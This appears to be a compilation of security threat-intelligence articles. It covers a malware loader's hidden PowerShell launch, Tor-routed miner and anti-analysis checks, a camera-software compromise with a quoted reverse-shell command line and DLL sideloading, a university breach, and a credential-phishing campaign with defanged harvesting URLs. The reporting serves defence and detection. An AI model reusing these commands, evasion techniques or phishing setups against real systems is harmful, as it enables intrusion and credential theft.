Saves the payload as a %TEMP%\$10_rand_char\$10_rand_char.ps1 PowerShell script and invokes it with the following parameters: -WindowStyle Hidden -ExecutionPolicy Bypass -File.

Finally, the injected payload into svchost.exe is an XMRig 6.26.0 miner with a hidden command line targeting a TLS-enabled onion mining endpoint through a local Tor SOCKS5 proxy. It can unpack and start Tor 0.4.9.12 plus lyrebird 0.8.1, monitor user-input activity to pause mining, and conditionally load the WinRing0 driver service for MSR-based mining optimization.

Although we observed an XMRig cryptominer as the final payload in this campaign, the YobaLoader is a generic loader. The operator can supply any PE or PowerShell payload via the signed DNS TXT tasking, so future waves may deliver different malware families.

Past Yoba Versions

Yoba exposes, through the same hashing algorithm it uses for anti-analysis, the specific process name under which it expects to run. Even without having full visibility into the campaign from the very beginning, analysts can still infer which targeted software was used to lure users by correlating this expected process name with the fake AI applications promoted on the associated GitHub repositories and GitHub Pages sites.

Hash

Process

Product

0xE6C2F326

Setup.exe

ChatGPT & Claude Opus

Unknown

Earlier YobaDropper observed in the wild appeared in early June 2026. In this campaign, the dropper was sideloaded by a process named Cursor.exe (hash: 0x56221573). It remains unclear whether Cursor.exe was a legitimate signed binary. The majority of the functionality in this early variant is consistent with the newer versions of both the dropper and the loader.

YobaDropper shows two main differences between its older and newer versions:

Unpacking logic: In the oldest version, the buffer is first Base64-decoded and then XOR-decrypted to extract the YobaLoader. In the newer version, the developer removed the Base64-decoding step and performs only XOR decryption, simplifying the unpacking process.

Execution method: The second change concerns how YobaLoader is triggered. The newer version uses Scheduled Tasks to start the copied legitimate host and sideload the loader, whereas the first discovered version creates the shortcut msdefender_scheduler{7940-8490-6670-1081}.lnk in the Startup folder. This shortcut executes a copied %APPDATA%\Microsaft Difendir\msdtc.exe and sideloads %APPDATA%\Microsaft Difendir\mswsock.dll.

Earlier version of YobaLoader contains language checks and excludes only Russia from infection. In later versions, these checks were moved to the dropper stage and expanded to exclude additional CIS countries, shifting regional filtering earlier in the infection chain.

Figure 14 — Exclusion of Russian language from infection.

While the overall DGA logic remains the same, the early variant uses the extension .aber[.]ir instead of .dedyn[.]io. In addition, instead of injecting into svchost.exe, this variant injects into a different running process identified only by its hashed name 0x21BD94C2.

The initial loader also implements several anti-analysis techniques that have been removed from the newer versions of the malware:

1. Anti-debuggingIt enumerates all kernel object types and reads their TypeName values. Each type name is hashed using DJB2 with the seed 0x1DEB until the hash matches 0xCF9EE149, which corresponds to DebugObject. If a DebugObject is found, it indicates that a debugger is or was active, and in that case the malware terminates itself.

Figure 15 — DebugObject via NtQueryObject-ObjectAllTypesInformation.

2. Anti-VMThe malware uses a VM/sandbox-detection scoring function while running several hardware fingerprinting checks. The maximum score is 6, and the minimum required to continue the infection chain is 3. The checks include:

Hypervisor-present bit and CPUID timing (via RDTSCP).

Hypervisor vendor signature string (CPUID leaf 0x40000000).

CPU brand string sanity checks (CPUID leaves 0x80000002–0x80000004).

SMBIOS-based firmware fingerprinting (GetSystemFirmwareTable–RSMB)

Figure 16 — Hypervisor vendor signature string technique.

Despite these small differences in early anti-analysis behavior, the Telegram channel and the profile image used as the seed for the DGA remain the same as in the newer variants, indicating that the operator retained the same infrastructure while iterating on the loader’s evasion logic.

Conclusion

The Yoba campaign shows how attackers can use trusted platforms and the current interest in AI tools to distribute malware in a way that looks believable and harmless at first glance. By packaging their code together with well-known software names and hosting it on GitHub, they lower the chances that users or basic security checks will immediately flag the files as suspicious.Although the underlying techniques are more advanced than typical commodity malware, the main goals remain straightforward: gain a foothold on the victim’s system, avoid easy detection, and then run the attacker’s chosen payload. Organizations should be cautious about installing “AI helpers” or similar tools from unverified repositories and should enforce policies that restrict running software from unknown sources. Combining user awareness with basic technical controls.

Attacks, Breaches & Threat Intel.title: Camera Management Software Compromise Leads to Malware Deployment
Attacks, Breaches & Threat Intel.context: The Attack Once the threat actor had compromised the camera management software, they added a file named rs
Attacks, Breaches & Threat Intel.full_text:
Acknowledgements: Special thanks to John Hammond, Ethan Williams, and Dray Agha for their contributions to this investigation and writeup.

Background

Security teams often focus on the software they know attackers target. But security weaknesses can exist in any software that touches an organization's environment, including tools that may not be viewed as part of the "traditional" attack surface. We recently saw a number of incidents where attackers were targeting less-scrutinized tools—camera management platforms—as a way to access the broader environment.

In September and October, Huntress observed a handful of incidents originating from camera management software (CMS.exe). Further investigation led us to assess that across all cases, a threat actor had compromised a legitimate camera management system as their initial access vector.

From there, the attack chain was loosely consistent across the multiple incidents: post-compromise, attackers would drop a file (rs.win32.exe) on the endpoint before performing DLL sideloading (via the legitimate Windows binary WpcMon.exe) in the user's AppData folder path. These would then run a beacon to 144.172.116[.]37.

Initial Access

Huntress analysts recently observed a campaign across multiple customer environments that led back to the compromise of camera management software, as seen in the process below.

C:\Program Files (x86)\CMS\CMS.exe

Huntress analysts were unable to determine the full name or creator/vendor of the software, as the file did not contain an embedded File Version Information section. However, we did find that the executable contained the following notable strings:

developerslavery

d3e3v4e3l9o9p0e3r4s2l9a1v4e3r4y6

hxxp://cloudapi.3r-dataware[.]com/sso/

The domain name 3r-dataware[.]com (pointing to a Korean company called 3R Global) may provide some insight into the source of the software. Figure 1 illustrates an excerpt of the Details page from a VirusTotal search for the domain name.

Figure 1: Whois results/VirusTotal search for 3r-dataware[.]com

Figure 2 illustrates the software download page at the kvision[.]ai website, pointing to a package named "CMS".

Figure 2: Kvision[.]ai software download page

Upon closer inspection of the CMS file downloadable from Kvision[.]ai's website, both contain the same developerslavery and d3e3v4e3l9o9p0e3r4s2l9a1v4e3r4y6 strings outlined above, as well as the 3r-dataware.com web address.

While the CMS package is listed on the software download page, we can't definitively say that the files were downloaded from this website: The connection between CMS.exe found on customer endpoints and the kvision[.]ai website is presented here as a possible source only, and not as a definitive statement of a vendor relationship.

Figure 3 illustrates network connections associated with CMS.exe.

Figure 3: Network connections linked to CMS.exe

Not only were Huntress analysts unable to definitively determine the exact name of the vendor who may have created the software from the contents of the executable file itself, but we were also unable to locate logs associated with the application. While this limited our visibility into how exactly threat actors were compromising this camera management software, we could see what they were doing in victim environments afterwards.

The Attack

Once the threat actor had compromised the camera management software, they added a file named rs.win32.exe to the endpoint. While the camera management software is located in the C:\Program Files (x86) folder, rs.win32.exe got dropped in the following folder:

C:\Users\<user>\AppData\Roaming\CMS\RemoteSetup\

The file was launched via the following command line:

rs.win32.exe -i "<IP Address>" -p "8000" -c <file> -r <file> "admin" "1234567a7654321"

This command line supplied a remote IP address and port (-p "8000"), included an admin username value for authenticating a remote-control session, and ran from the user-writable AppData\Roaming\CMS\RemoteSetup path (rather than a protected application directory). This led us to see this as a reverse shell.

From there, the threat actor then dropped the legitimate Microsoft file WpcMon.exe in the following folder:

C:\Users\<user>\AppData\Local\Microsoft\WpcMon\

Based on the SHA256 hash for this file, we could verify that WpcMon.exe is the legitimate Microsoft Windows Parental Control Monitor file, used for parental-control and activity-monitoring features. However, in this incident it stands out because the folder it is dropped in (AppData) is not the folder where we normally expect to see this file (i.e., C:\Windows\system32). This red flag revealed that threat actors were abusing this legitimate file for their attack.

The file was dropped into this location so that it could be used for DLL sideloading the intended malware, where an attacker places a malicious DLL beside a legitimate application so the application loads it and runs the attacker's code. In these incidents, the malicious DLLs in question were IPHLPAPI.DLL and samcli.dll, both of which appeared to be legitimate zlib compression libraries. However, they had been modified to incorporate beaconing functionality, periodically contacting an external command-and-control (C2) server.

Part of the infection process also included creating persistence by adding a reference to the newly installed WpcMon.exe in a value beneath the user's Run key, as shown in Figure 4. Threat actors typically add a program path to a user's Run registry key so Windows automatically launches their payload whenever that user signs in.

Figure 4: Persistence "foothold" signal

Figure 5 illustrates the process tree leading to the detection of WpcMon.exe running on the endpoint for the first time and spawning from rs.win32.exe and CMS.exe.

Figure 5: Process tree

In all incidents, the C2 IP address observed on impacted endpoints was 144.172.116[.]37, which is shown in Figure 6.

Figure 6: Active network connection

Caught on camera: Find your blind spots

What's clear from this series of incidents is that they are all stemming from a weakness in a camera management software. After using this software for initial access, attackers hid malicious DLLs behind a legitimate Windows binary and established beaconing to a C2.

Defenders should treat cameras and their management platforms as potential entry points into their broader environment: businesses should inventory the software, restrict its access, and monitor for unusual processes and outbound connections.

Where practical, organizations should also use application control to prevent unapproved executables and DLLs from running in user-writable paths, and investigate the sequence of CMS.exe, rs.win32.exe, abnormal WpcMon.exe, and unapproved outbound connections.

Attacks, Breaches & Threat Intel.title: Copenhagen University Breach Compromises Data on Half a Million People
Attacks, Breaches & Threat Intel.context: A cyber-attack on a leading Danish university has resulted in the compromise of sensitive personally identifiable information (PII) on over half a million individuals
Attacks, Breaches & Threat Intel.full_text:
A cyber-attack on a leading Danish university has resulted in the compromise of sensitive personally identifiable information (PII) on over half a million individuals.

The University of Copenhagen (UCPH) first revealed the news on October 23 but added an update on October 25 claiming that physical access PIN codes for around 20,0000 staff and students were also compromised.

In total, it said around 525,000 people were affected by the data breach, which occurred when hackers were able to access a test environment.

According to the university, the attack was detected on October 20 and “subsequently brought under control,” although it took three more days to issue a public notification.

Read more on university cyber-attacks: Ransomware Attacks Targeting Universities on the Rise

“The database contains personally identifiable information such as full name, national identity number, work telephone number, home telephone number and personal email address,” the original notice explained.

“The university estimates that the incident falls within the scope of the General Data Protection Regulation (GDPR), and the matter is being handled in accordance with applicable regulations. The incident has been reported to the Danish Data Protection Agency, and other relevant authorities are being kept closely informed.”

The university originally claimed that “there is no indication” that its attackers accessed systems “supporting day-to-day operations,” or that its “activities or operations” had been impacted.

However, it later admitted that several administrative systems including document management platform Workzone and application budgeting tool Nimbus were suffering disruption.

“This is a preventive and controlled shutdown of the administrative systems in question, as UCPH was exposed to a new hacker attack earlier Monday. There may be challenges accessing UCPH's websites,” it added.

On October 23, the university also restricted physical access to “selected critical locations on campus” while it reset the compromised PIN codes.

Universities Under Attack

Higher education institutions have long been a popular target for both cybercriminals and nation state actors – the former focused on stealing monetizable PII from staff and students and the latter on sensitive research and IP.

A Comparitech study from July claimed that the number of ransomware attacks against universities between January and June increased by 8% compared with the previous six months, thanks mainly to The Gentlemen group.

Extensive, decentralized and relatively open networks, a low tolerance for outages, and large user numbers make universities a popular target.

According to the most recent UK government figures published on April 30, almost every higher education institution (98%) identified a breach or attack in the previous 12 months.

The biggest incident in the sector so far this year came when ShinyHunters targeted the Canvas Learning Management System used by many universities to compromise around 275 million records from over 8000 educational institutions.

However, the breach at Copenhagen University ranks as one of the worst single incidents of its kind this year, in terms of the number of victims and the sensitivity of the data, which could be used to craft convincing follow-on phishing attacks and identity fraud attempts.

No threat actor had publicly claimed responsibility for the breach at the time of writing.

Attacks, Breaches & Threat Intel.title: From federal SOCs to Talos: Ryan Fetterman on practical security research
Attacks, Breaches & Threat Intel.context: He shares the realities of detection engineering — including the creative, often frustrating ways attackers evolve their tactics to stay one step ahead of traditional defenses
Attacks, Breaches & Threat Intel.full_text:
What does it mean to be "blue collar" for the blue team? Amy sat down with security researcher Ryan Fetterman to discuss his journey from federal agency work to his new role at Talos. He shares the realities of detection engineering — including the creative, often frustrating ways attackers evolve their tactics to stay one step ahead of traditional defenses.Beyond the technical grind, Ryan shares his philosophy on building a career in security without burning out. From the value of project-based learning to the importance of finding time to step away from the keyboard, here's Ryan's take on what it really means to navigate today's cybersecurity industry.

Amy Ciminnisi: Tell me a little bit about the journey that has taken you to Talos, from early on in your career through to now. How did you get here? I actually don't know that much about it.

Ryan Fetterman: I've been doing security about 15 years now, and my career was largely shaped by where I started in the DC area. I spent about a decade there. I started out in consulting and then pivoted over to research, but that was a great place to get started.

I got a lot of great experience in federal agencies and government consulting, continued my education down there, got trained up, got certifications and things like that. And that was where I got my first exposure to doing actual security operations, which is what I really stuck with. It was my first exposure to Splunk.

Querying lots of log data and building visualizations and analytics in Splunk was the first time in my career that I felt it was kind of my natural inclination. It seems like it should have been more obvious to me looking back on it, but it's something that I try to explain to people a lot. When you first get into security, there's a desire to kind of find your specialization and start working towards it. But in my experience, it's just not something that you can rush.

I met the people connected with that space, which eventually led to me going to work for Splunk. I worked on the Splunk research team, SURGe. And then after the Cisco acquisition of Splunk, I ultimately became reorganized into Talos.

AC: I'm sure there have been so many challenges, so many obstacles in your way as you're trying to do this research. Can you share one that you've faced and how it shaped your perspective on cybersecurity?

RF: Something that stuck with me was actually my first advanced persistent threat (APT) incident. Now, you can look this up. It's called Pandora Song if you search for the C2. I was in the DC area working in a federal SOC, and I was doing some of the first host-based analytics at the time, which have now become kind of the concentration of a lot of detection. Engineering and analytics are host-based, so this was kind of pioneering at the time.

I was looking at a lot of host-based sensors and writing analytics in Splunk, actually, and we had been tipped off to this incident by a third party. I was looking through the details of the incident and how the attacker was carrying out the progression of their attack...

Want to see more? Watch the full interview, and don’t forget to subscribe to our YouTube channel for future episodes of Humans of Talos.

Attacks, Breaches & Threat Intel.title: Your Attack Surface Is Growing Faster Than Your Team Can Respond
Attacks, Breaches & Threat Intel.context: As AI helps attackers accelerate reconnaissance and exploitation, organizations need to reduce the opportunities that make attacks possible in the first place
Attacks, Breaches & Threat Intel.full_text:
Security teams cannot keep responding faster forever. As AI helps attackers accelerate reconnaissance and exploitation, organizations need to reduce the opportunities that make attacks possible in the first place.

That requires a pivot toward prevention and a broader view of exposure. An unpatched application matters, but so do unnecessary administrative privileges, forgotten internet-facing services, or legitimate tools available to someone who never needs them. Individually, these weaknesses may attract little attention. Connected, they can create an attacker pathway to the systems and data the business depends on.

An exposure management strategy helps organizations understand these connections and act before an attacker does. For lean IT and security teams, it also offers a practical way to reduce workload: fewer opportunities for attackers can mean fewer alerts to investigate and respond to.

Why Is Exposure Management Crucial Now?

AI is putting pressure on security from multiple directions. Attackers can use it to accelerate their operations, while employees’ adoption of AI applications, assistants, and agents introduces additional access and interactions to secure.

Detection and response remain essential. However, making them carry most of the defensive burden leaves teams dependent on quickly identifying and interrupting every intrusion.

Meanwhile, many attack opportunities involve capabilities organizations already have. Bitdefender Labs’ analysis of 700,000 security incidents found that living-off-the-land techniques, which abuse legitimate tools, appeared in 84% of major attacks. Patching alone cannot address the unnecessary access that makes those techniques possible.

The challenge is operational, too. In the 2026 Bitdefender Cybersecurity Assessment, 38% of security professionals cited the overhead of maintaining hardening rules and exceptions as a barrier to shrinking their attack surface.

Organizations need prevention that adapts as their environment changes and fits the capacity of the people responsible for securing it.

What Is an Exposure Management Strategy?

Exposure management is the ongoing practice of identifying, prioritizing, and reducing weaknesses attackers could exploit across an organization’s attack surface.

It extends beyond vulnerability management. Software vulnerabilities are part of the picture, alongside misconfigurations, exposed services, identity risks, and unnecessary access to powerful tools.

An effective strategy connects three activities.

First, establish visibility into relevant exposures.

Second, prioritize them using context, including the assets an attacker could reach.

Third, reduce those exposures and reassess the environment.

This is continuous work because exposure changes whenever accounts gain privileges, services become publicly accessible, or business requirements evolve. Threat Exposure Management provides a framework for organizing that repeatable process. Technology supports the program; ownership and follow-through make it effective.

How Does GravityZone Turn Visibility Into Prevention?

Bitdefender GravityZone Exposure Management combines visibility, prioritization, and adaptive hardening to help teams remove attack opportunities.

Endpoint Risk Management identifies vulnerabilities and risky configurations. External Attack Surface Management adds an attacker’s outside view of internet-facing assets and services. User risk insights and Unified Identities help teams understand accounts, behaviors, and privileges that contribute to exposure.

There is also Attack Path Analysis, which connects findings into potential routes toward critical assets. That context can change the remediation order. A medium-severity vulnerability on a privileged user’s workstation may deserve attention ahead of a higher-severity finding on an isolated system.

It also helps teams identify shared points across multiple routes, where one change could interrupt several potential paths. The analysis models connections from available findings; teams still need to assess and implement the appropriate fixes.

However, teams can add automated action through GravityZone PHASR (Proactive Hardening and Attack Surface Reduction). It learns how each machine-user combination operates and restricts unnecessary access to tools and behaviors attackers like to abuse. Hardening can adapt as legitimate usage changes.

What Outcomes Should Organizations Expect?

The primary outcome of continuous exposure management is reduced opportunity for compromise. Closing an exposed service, addressing a dangerous configuration, or restricting unnecessary tool access can remove an opening or constrain an attacker’s next move.

Better prioritization helps teams direct limited resources to the most consequential work. For example, what if an administrator account connects to several potential attack paths? Removing unnecessary access may reduce exposure across multiple systems, giving the team a clearer reason to prioritize the change.

Dynamic hardening can also reduce the manual effort of policy maintenance. PHASR allows teams to review recommendations or use Autopilot to apply them. Changes are audited and reversible, and teams can grant access when legitimate work requires it. These safeguards help teams reduce risk while managing operational disruption.

A further outcome is clearer evidence of progress. Leaders can track changes in risk posture and new or resolved attack paths, connecting security work to the routes toward important assets that have been closed.

Reducing attack opportunities can ease pressure on teams of all sizes and especially lean teams.

How Can Lean Teams Put an Exposure Management Strategy Into Practice?

Start with business priorities: the systems, identities, and services whose compromise would cause the greatest harm. Establish visibility, identify high-risk exposures, and assign responsibility for reducing them. Reassess after changes to confirm progress and identify what needs attention next.

GravityZone Exposure Management supports and simplifies this approach within GravityZone or alongside third-party endpoint protection and EDR. Organizations can build on existing investments and extend their program with separately licensed capabilities, including automated patching, cloud security posture management, and GravityZone AI Visibility and Control.

The strategic goal is to make prevention, through continuous risk reduction, part of everyday security operations. This helps close attack opportunities before they become an incident.

Locked and Loaded: Phishing through Fake Bids and Protected Documents
Attacks, Breaches & Threat Intel.context: Password protection lends the file an air of legitimacy, mimicking a practice companies use every day, while providing threat actors with a critical advantage - most email...
Attacks, Breaches & Threat Intel.full_text:
By Don Santos, Cofense Phishing Defence Centre

In the sales process, few emails carry as much weight as an invitation to bid. It opens the conversation that can eventually lead to revenue, and professionals are conditioned to treat it with urgency and care. Threat actors understand this, and they have learned to pair that urgency with a simple tactic: the password-protected document. Password protection lends the file an air of legitimacy, mimicking a practice companies use every day, while providing threat actors with a critical advantage - most email security tools cannot inspect the contents of an encrypted file. In this walkthrough, we break down how an important sales invitation and a "secured" document combine to set up a tricky and deceptive credential phishing campaign.

Figure 1: Invite to Bid Email Body

The campaign starts with an email titled "Project Bid Invitation - Proposal Due August 35, 2026" as shown above in Figure 1. The subject and opening message immediately signal good news: an invitation to bid for a new project. The prospect of new business has a way of lowering an employee's guard because it often encourages a sense of urgency, not scepticism. The message says more details are in the password protected PDF attachment. This is another factor that makes the campaign tricky, as it’s a simple yet remarkably effective tactic for evading suspicion. It builds a false sense of trust with the recipient, and more importantly, it allows suspicious URLs or payloads to evade detection from automated email security tools. These tools typically work by scanning a file’s contents for suspicious patterns, but encryption keeps that content unreadable until a password is manually entered, letting the payload bypass detection entirely. Invitations to bid and password-protected files are also used in legitimate business processes, imitating these makes it difficult for untrained employees to spot suspicious emails, as shown in Figure 1. Adding to the difficulty is the fact that the sender's email address itself may belong to a legitimate, previously compromised account rather than an obviously spoofed or unfamiliar domain. This adds another layer of trust, removing one of the most apparent red flags before the recipient even opens the message.

Figure 2: Inside the Password Protected PDF

If the recipient does proceed with opening the attached PDF and unlocking it, the file reveals content as shown in Figure 2: a single button styled to resemble a OneDrive document preview, prompting them to "View" or "Download" the project files. With only one possible action, there is no room for ambiguity, and the familiar OneDrive branding makes the next click feel valid and legitimate. Hovering over the button reveals the underlying URL, [hXXps://slotpastimaxwin50jt[.]online/autoproject@autoproject[.]com/index[.]php], a clear red flag, as this is not a OneDrive domain, but a redirecting URL designed to carry the recipient further into the campaign.

Figure 3: Fake Bid Document Drive

Clicking the View/Download button leads to a page that resembles a shared document drive, complete with a list of files that appear to be related to a real contract, as shown above in Figure 3. This displays an effort to be consistent with the "invitation to bid" narrative, keeping the intended target hooked and committed to see the process through. Just like a legitimate shared document page, the intended target can choose which files to download via checkbox, then click "Download Selected", continuing the illusion of a normal bid process.

Figure 4: Email Input Required

Once the "Download Selected" button is clicked, a pop-up window appears asking for an email address, as seen in Figure 4. This again mimics the behaviour of real shared document platforms, which often request a login email to confirm that only the intended recipient can access the file. Entering an email to continue redirects to the fake Microsoft login, closely resembling the real Microsoft sign-in, first asking for an email, then a password, as shown in Figure 5. Looking at the address bar reveals the URL [hXXps://mm-lasertechnik[.]lastingonlineexperiences[.]de/1Dmw9/?key=NKsIDYXvtY], a clear indication that the victim is not on a real Microsoft sign-in page. If the victim proceeds to enter their email and password here, the credentials are sent directly to the attacker's server [hXXps://nbpn[.]lastingonlineexperiences[.]de/nasa[.]php], completing the phish.

Figure 5: Fake Microsoft Login Page

This campaign shows how threat actors continue to weaponize everyday business processes such as invitations to bid, password-protected files, and shared document platforms, turning them into effective phishing campaigns. The best defence is a habit of caution at every stage: Was this bid expected? Does the sender's domain check out? Does the URL of the login page match the platform it claims to be? When something feels off, contact your IT or security team before entering any credentials, as a moment of caution costs far less than a compromised account. Cofense combines phishing-specific AI trained on expert-validated, real-world intelligence with campaign-level remediation. Once a threat is confirmed, analyst-controlled quarantine can extend across the related campaign, with explainable decisions and a full audit trail. Schedule a demonstration to see how Cofense helps stop trusted-brand credential phishing after it gets through.
